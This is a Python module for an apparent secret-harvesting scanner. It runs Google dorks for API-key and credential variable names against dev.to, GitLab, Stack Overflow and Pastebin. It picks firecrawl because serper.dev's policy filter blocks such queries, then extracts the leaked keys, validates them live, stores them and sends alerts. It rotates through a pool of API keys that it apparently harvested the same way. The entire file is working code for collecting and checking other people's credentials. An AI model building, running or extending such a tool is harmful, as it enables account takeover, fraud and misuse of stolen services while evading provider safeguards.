"""
Generic web-dork scanner — hunt secrets across multiple platforms via
Google search proxied through firecrawl.dev /v1/search.

Architecture (lessons learned from replit_scanner Phase 2):
  - serper.dev rejects ALL secret-hunting dorks (400 'Query not allowed')
    → use firecrawl /v1/search exclusively (no policy filter — accepts any query)
  - Multi-quoted dorks ('site:X "Y" "Z"') return 0 results from firecrawl
    → use single-token unquoted format
  - Replit blocks bots so source code isn't searchable; THESE platforms
    don't have that issue:
      * dev.to       — open API, tutorials with hardcoded keys, mid yield
      * gitlab.com   — public repos, no Partner Program revoke, mid-high
      * stackoverflow.com — error traces with raw keys, mid yield
      * pastebin.com — devs dump .env, raw text indexed, high yield

Each platform is targeted with the same set of provider-keyword dorks.
firecrawl-search returns URL+snippet; we extract from snippet first
(often contains the leaked secret), fall back to fetching full content
via firecrawl /v1/scrape only when snippet has trigger but extractor empty.

file_type set per-platform so source_breakdown attributes correctly.

Pool reuse:
  - Serper.dev keys: 150+ valid in our DB pool (currently unused —
    serper rejects everything; we keep the pool for non-secret-related
    GitHub Code Search where it works)
  - Firecrawl keys: 77+ valid in our DB pool
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import random
from datetime import datetime, timezone

import httpx

import db
from patterns import EXTRACTORS, AI_TRIGGER, INFRA_TRIGGER
from infra_patterns import INFRA_EXTRACTORS, extract_destination, assess_risk
from deobfuscate import expand as _deobf_expand
from validators import validate
from notifier import notify_found, notify_infra_found

log = logging.getLogger(__name__)

WEB_DORK_SCAN_INTERVAL = int(os.environ.get("WEB_DORK_SCAN_INTERVAL", "1800"))  # 30 min
WEB_DORK_RESULTS_PER_QUERY = int(os.environ.get("WEB_DORK_RESULTS_PER_QUERY", "10"))

_FIRECRAWL_SEARCH = "https://api.firecrawl.dev/v1/search"
_FIRECRAWL_SCRAPE = "https://api.firecrawl.dev/v1/scrape"
_LIMITS = httpx.Limits(max_connections=15, max_keepalive_connections=5, keepalive_expiry=20)


# ── Platforms config ────────────────────────────────────────────────────────
# Each platform = {site, file_type_label, generic_dorks_extra}.
# Per-provider dorks generated automatically from PROVIDER_TOKENS list.

PROVIDER_TOKENS = [
    # AI providers (env-var literals)
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY",
    "DEEPSEEK_API_KEY", "GROQ_API_KEY", "XAI_API_KEY", "MISTRAL_API_KEY",
    "PERPLEXITY_API_KEY", "OPENROUTER_API_KEY", "TOGETHER_API_KEY",
    "FIREWORKS_API_KEY", "REPLICATE_API_TOKEN", "HF_TOKEN", "HUGGINGFACE_TOKEN",
    "ELEVENLABS_API_KEY", "STABILITY_API_KEY", "FAL_KEY",
    # CN providers
    "ZHIPUAI_API_KEY", "MOONSHOT_API_KEY", "ARK_API_KEY", "DASHSCOPE_API_KEY",
    "QWEN_API_KEY", "SILICONFLOW_API_KEY", "KLING_ACCESS_KEY",
    # Aggregators
    "AIMLAPI_API_KEY", "DEEPINFRA_TOKEN", "HYPERBOLIC_API_KEY", "PORTKEY_API_KEY",
    "NOVITA_API_KEY",
    # Replit (passive coverage)
    "REPLIT_DB_URL", "REPLIT_API_TOKEN",
    # Infra critical
    "AKIA",                  # AWS access key prefix
    "DATABASE_URL",
    "MONGODB_URI",
    "REDIS_URL",
    "SUPABASE_URL", "SUPABASE_KEY",
    "PINECONE_API_KEY",
    # Bot tokens
    "DISCORD_TOKEN", "TELEGRAM_BOT_TOKEN", "STRIPE_SECRET_KEY",
    "TWILIO_AUTH_TOKEN", "SENDGRID_API_KEY",
]

PLATFORMS = [
    {
        "name":       "devto",
        "site":       "dev.to",
        "file_type":  "devto",
        # Tutorial articles often have inline code with keys
        "extra":      ["api key tutorial", "rag pipeline langchain", ".env file"],
    },
    {
        "name":       "gitlab",
        "site":       "gitlab.com",
        "file_type":  "gitlab",
        # GitLab public repos — no Partner Program revoke (unlike github)
        "extra":      ["inurl:.env", ".env.example raw", "blob/main/.env"],
    },
    {
        "name":       "stackoverflow",
        "site":       "stackoverflow.com",
        "file_type":  "stackoverflow",
        # Devs paste error traces with full code including raw keys
        "extra":      ["error api key", "401 unauthorized python", "openai sdk error"],
    },
    {
        "name":       "pastebin",
        "site":       "pastebin.com",
        "file_type":  "pastebin",
        # Pure raw text dumps — high signal density
        "extra":      [".env", "api_key", "config dump"],
    },
]


def _build_dorks() -> list[tuple[str, dict]]:
    """Returns list of (query_str, platform_dict) tuples."""
    dorks = []
    for plat in PLATFORMS:
        site = plat["site"]
        # Per-provider single-token dorks
        for tok in PROVIDER_TOKENS:
            dorks.append((f"site:{site} {tok}", plat))
        # Platform-specific extra patterns
        for extra in plat.get("extra", []):
            dorks.append((f"site:{site} {extra}", plat))
    return dorks


_DORKS = _build_dorks()


# ── Key pool helpers ────────────────────────────────────────────────────────

def _firecrawl_keys() -> list[str]:
    rows = db.get_valid_keys_by_provider("firecrawl")
    keys = [r["key_full"] for r in rows]
    random.shuffle(keys)
    return keys


def _mark_dead(provider: str, key: str):
    h = hashlib.sha256(key.encode()).hexdigest()
    try:
        db.update_key_validity(h, False)
        log.warning("[web_dork] marked %s key dead: %s", provider, key[:14])
    except Exception:
        pass


# ── Firecrawl search (with key rotation) ───────────────────────────────────

async def _firecrawl_search(client: httpx.AsyncClient, query: str,
                            keys: list[str]) -> list[dict]:
    last_err = ""
    for key in keys:
        try:
            r = await client.post(
                _FIRECRAWL_SEARCH,
                headers={"Authorization": f"Bearer {key}",
                         "Content-Type": "application/json"},
                json={"query": query, "limit": WEB_DORK_RESULTS_PER_QUERY},
                timeout=25,
            )
            if r.status_code in (401, 402, 403):
                _mark_dead("firecrawl", key)
                last_err = f"firecrawl {r.status_code}"
                continue
            if r.status_code == 429:
                last_err = f"firecrawl 429 on {key[:14]}"
                continue
            if r.status_code == 400:
                log.warning("[web_dork] firecrawl 400 BAD %r — body: %s",
                            query[:80], r.text[:200])
                return []
            if r.status_code != 200:
                last_err = f"firecrawl status={r.status_code}"
                continue
            data = r.json()
            if not data.get("success"):
                last_err = f"success=false: {r.text[:160]}"
                continue
            return [{"url":   it.get("url") or it.get("link") or "",
                     "title": it.get("title", ""),
                     "snippet": it.get("description") or it.get("snippet") or ""}
                    for it in (data.get("data") or [])]
        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:120]}"
    log.warning("[web_dork] firecrawl /search failed for %r: %s", query[:60], last_err)
    return []


# ── Firecrawl scrape (full markdown for fallback) ──────────────────────────

async def _firecrawl_fetch(client: httpx.AsyncClient, url: str,
                           keys: list[str]) -> str | None:
    last_err = ""
    for key in keys[:3]:  # cap retries to 3 keys per URL
        try:
            r = await client.post(
                _FIRECRAWL_SCRAPE,
                headers={"Authorization": f"Bearer {key}",
                         "Content-Type": "application/json"},
                json={"url": url, "formats": ["markdown"]},
                timeout=30,
            )
            if r.status_code in (401, 402, 403):
                _mark_dead("firecrawl", key)
                continue
            if r.status_code != 200:
                last_err = f"scrape status={r.status_code}"
                continue
            data = r.json()
            md = (data.get("data") or {}).get("markdown") or ""
            return md or None
        except Exception as e:
            last_err = f"{type(e).__name__}"
    log.debug("[web_dork] firecrawl fetch failed for %s: %s", url[:80], last_err)
    return None


async def _direct_fetch(client: httpx.AsyncClient, url: str) -> str | None:
    try:
        r = await client.get(url, timeout=15, follow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0 ghscan-web-dork/1.0"})
        if r.status_code == 200:
            return r.text
    except Exception:
        pass
    return None


# ── Content scanning ───────────────────────────────────────────────────────

async def _scan_text(text: str, url: str, file_type: str) -> tuple[int, int]:
    """Run AI + infra extractors on text. Returns (ai_keys_saved, valid_saved)."""
    if not text:
        return 0, 0
    text = _deobf_expand(text)
    has_ai    = any(t in text for t in AI_TRIGGER)
    has_infra = any(t in text for t in INFRA_TRIGGER)
    if not has_ai and not has_infra:
        return 0, 0

    repo_label = url[:200]
    ks_total = vs_total = 0

    if has_ai:
        for prov, fn in EXTRACTORS.items():
            for key in fn(text):
                if db.key_exists(key):
                    continue
                try:
                    is_valid = await validate(prov, key)
                except Exception:
                    is_valid = False
                saved = db.save_key(
                    prov, key, repo_label, "web-dork-page", url,
                    0, "", file_type, is_valid,
                )
                if saved:
                    ks_total += 1
                    if is_valid:
                        vs_total += 1
                    try:
                        await notify_found(prov, key, repo_label, "web-dork-page",
                                           url, 0, "", file_type, is_valid)
                    except Exception:
                        pass
                    log.info("[%s %s] %s from %s", file_type,
                             "VALID" if is_valid else "found", prov, url[:80])

    if has_infra:
        risk_cache = None
        for iprov, ifn in INFRA_EXTRACTORS.items():
            try:
                creds = ifn(text)
            except Exception:
                continue
            if not creds:
                continue
            if risk_cache is None:
                risk_cache = assess_risk(text, "web-dork-page", 0, "")
            risk_level, risk_reasons = risk_cache
            for cred in creds:
                if db.infra_exists(cred):
                    continue
                destination = extract_destination(cred) if "://" in cred else ""
                saved = db.save_infra(
                    iprov, cred, repo_label, "web-dork-page", url,
                    0, "", file_type, destination, risk_level, risk_reasons,
                )
                if saved:
                    try:
                        await notify_infra_found(iprov, cred, repo_label,
                                                 "web-dork-page", url, 0, "",
                                                 file_type, destination,
                                                 risk_level, risk_reasons)
                    except Exception:
                        pass
                    log.info("[%s infra/%s] %s from %s", file_type, iprov,
                             destination[:60] or cred[:30], url[:80])

    return ks_total, vs_total


# ── Per-dork worker ────────────────────────────────────────────────────────

async def _process_dork(client: httpx.AsyncClient, query: str, plat: dict,
                        fc_keys: list[str]) -> dict:
    file_type = plat["file_type"]
    site = plat["site"]
    results = await _firecrawl_search(client, query, fc_keys)
    if not results:
        return {"results": 0, "ai_saved": 0, "valid_saved": 0, "fetched": 0}

    ai_saved = valid_saved = fetched = 0
    for r in results:
        url = r.get("url", "")
        if site not in url:
            continue
        snippet = (r.get("snippet") or "") + " " + (r.get("title") or "")

        # Phase 1: scan snippet
        ks, vs = await _scan_text(snippet, url, file_type)
        ai_saved += ks
        valid_saved += vs

        # Phase 2: full-content fetch when snippet had trigger but no extractor hit
        snippet_had_trigger = (any(t in snippet for t in AI_TRIGGER)
                               or any(t in snippet for t in INFRA_TRIGGER))
        if snippet_had_trigger and ks == 0:
            full = None
            if fc_keys:
                full = await _firecrawl_fetch(client, url, fc_keys)
            if not full:
                full = await _direct_fetch(client, url)
            if full:
                fetched += 1
                ks2, vs2 = await _scan_text(full, url, file_type)
                ai_saved += ks2
                valid_saved += vs2

    return {"results": len(results), "ai_saved": ai_saved,
            "valid_saved": valid_saved, "fetched": fetched}


# ── Cycle ───────────────────────────────────────────────────────────────────

async def run_web_dork_cycle():
    fc_keys = _firecrawl_keys()
    if not fc_keys:
        log.warning("[web_dork] no firecrawl keys in pool — skipping cycle")
        return

    log.info("=== web_dork cycle start | %d firecrawl keys | %d dorks across "
             "%d platforms ===", len(fc_keys), len(_DORKS), len(PLATFORMS))

    cycle_results = cycle_ai = cycle_valid = cycle_fetched = 0
    per_platform = {p["name"]: {"r":0,"v":0} for p in PLATFORMS}

    async with httpx.AsyncClient(follow_redirects=True, limits=_LIMITS) as client:
        for query, plat in _DORKS:
            try:
                stats = await _process_dork(client, query, plat, fc_keys)
                cycle_results += stats["results"]
                cycle_ai += stats["ai_saved"]
                cycle_valid += stats["valid_saved"]
                cycle_fetched += stats["fetched"]
                per_platform[plat["name"]]["r"] += stats["results"]
                per_platform[plat["name"]]["v"] += stats["valid_saved"]
                if stats["valid_saved"] > 0:
                    log.info("[web_dork %s] %r → %d results, %d valid",
                             plat["name"], query[:60], stats["results"],
                             stats["valid_saved"])
            except Exception as e:
                log.warning("[web_dork dork failed] %r: %s", query[:60], e)
            await asyncio.sleep(2.0)

    plat_summary = ", ".join(f'{p}={s["r"]}r/{s["v"]}v'
                             for p, s in per_platform.items())
    log.info("=== web_dork cycle done | %d total results | %d ai_keys (%d valid) "
             "| %d fetches | per-platform: %s ===",
             cycle_results, cycle_ai, cycle_valid, cycle_fetched, plat_summary)


async def web_dork_loop():
    if not db.get_valid_keys_by_provider("firecrawl"):
        log.info("[web_dork] no firecrawl keys yet — waiting for harvest")
        await asyncio.sleep(3600)

    log.info("web_dork scanner started | interval=%ds | %d platforms | %d dorks",
             WEB_DORK_SCAN_INTERVAL, len(PLATFORMS), len(_DORKS))
    await asyncio.sleep(60)  # boot delay
    while True:
        try:
            await run_web_dork_cycle()
        except Exception as e:
            log.error("web_dork cycle crashed: %s", e)
        log.info("web_dork sleeping %ds until next cycle", WEB_DORK_SCAN_INTERVAL)
        await asyncio.sleep(WEB_DORK_SCAN_INTERVAL)
